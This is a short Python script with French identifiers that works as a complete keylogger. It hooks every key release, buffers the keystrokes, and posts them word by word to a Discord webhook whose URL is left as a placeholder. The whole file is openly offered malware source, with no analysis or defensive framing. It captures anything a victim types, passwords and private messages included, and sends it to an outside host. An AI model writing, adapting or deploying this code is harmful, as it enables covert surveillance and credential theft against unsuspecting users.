import time
import keyboard
import requests

WEBHOOK_URL = 'WEBHOOK_DISCORD'
keylogs = []

def envoyer_keylogs():
    global keylogs  
    if keylogs:
        texte = ''.join(keylogs)
        payload = {
            'content': texte
        }
        requests.post(WEBHOOK_URL, data=payload)
        keylogs = []

def capturer(event):
    global keylogs
    if event.name == 'space':
        envoyer_keylogs()
    elif event.name == 'backspace':
        if keylogs:
            keylogs.pop()
    else:
        keylogs.append(event.name)

keyboard.on_release(callback=capturer)
while True: 
    time.sleep(1)
